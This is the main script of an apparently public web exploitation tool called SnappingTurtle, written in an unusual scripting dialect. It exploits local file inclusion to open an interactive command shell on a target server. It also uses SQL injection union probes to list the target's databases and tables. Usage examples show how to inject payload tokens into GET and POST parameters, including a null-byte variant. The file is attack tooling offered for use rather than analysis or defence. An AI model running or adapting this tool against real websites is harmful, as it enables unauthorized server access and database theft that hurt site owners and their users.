import('json');

class ShellCommand {
    Quit: 'quit',
};

shellLoop = @(shell) {
    while (true) {
        cmd = raw_input('st>');
        
        switch (cmd) {
            ShellCommand.Quit: {
                print('Exiting');
                quit();
            }
            default: cmd |> shell.run |> print;
        }
    }
};

listTables = @(tmpl) {
    probe = SqlUnionProbe(tmpl);
    di = probe.listSchemas();
    print('[+] %s databases found\r\n' % di.dbs.keys() |> len);
    for (x in di.dbs.keys()) print('    ' + x);
};

print('SnappingTurtle Web Exploitation Tool 0.1.' + __BUILD__);
print('AutoSec Tools - http://autosectools.com/\r\n');

if (hasArgs) {
    shell = null;
    tmpl = HttpRequestTemplate(args.Url, args.Get, args.Post);
    
    switch (args.Mode) {
        ClassOption.Lfi: {
            print('[i] Exploiting local file inclusion');            
            shell = LfiShell(tmpl);
            
            if (!shell.create()) {
                print('[X] Failed to create shell, exiting');
                quit();
            }
        }
        
        ClassOption.Sqli: {
            print('[i] Exploiting SQL injection');
            
            switch (args.ModeOption) {
                SqliOption.List: {
                    print('[?] Listing databases and tables');
                    listTables(tmpl);
                }
                    
                default: {
                    print('[X] Invalid SQL injection option');
                    quit();
                }
            }
            
            quit();
        }
        
        default: {
            print('[X] Invalid mode: %s' % args.Mode);
            quit();
        }
    }

    shellLoop(shell);
} else {    
    print('python st.py [mode (required)] [url (required)] [options]\r\n');
    print('# Modes\r\n');
    print('  -lfi               Local file inclusion. Injection is performed using the $lfi token.');
    print('  -sqli {options}    SQL injection. Injection is performed using the $sqli token.');
    print('         list        Dump a list of databases and tables.');    
    print('');
    print('# Url\r\n');
    print('  The url to exploit. Can be injected into using tokens.\r\n');
    print('# Options\r\n');
    print('  --g {GET name} {GET value}     GET data in key/value format.');
    print('  --p {POST name} {POST value}   POST data in key/value format.');
    print('  -g {GET data}                  GET data in Python map format.');
    print('  -p {POST data}                 POST data in Python map format.');
    print('');
    print('# Examples\r\n');
    print('  python st.py -lfi http://localhost/test.php?theme=$lfi\r\n');
    print('  python st.py -lfi http://localhost/test.php?theme=$lfi%00\r\n');
    print('  python st.py -lfi http://localhost/postTest.php -p "{\'theme\':\'$lfi\'}"\r\n');
}
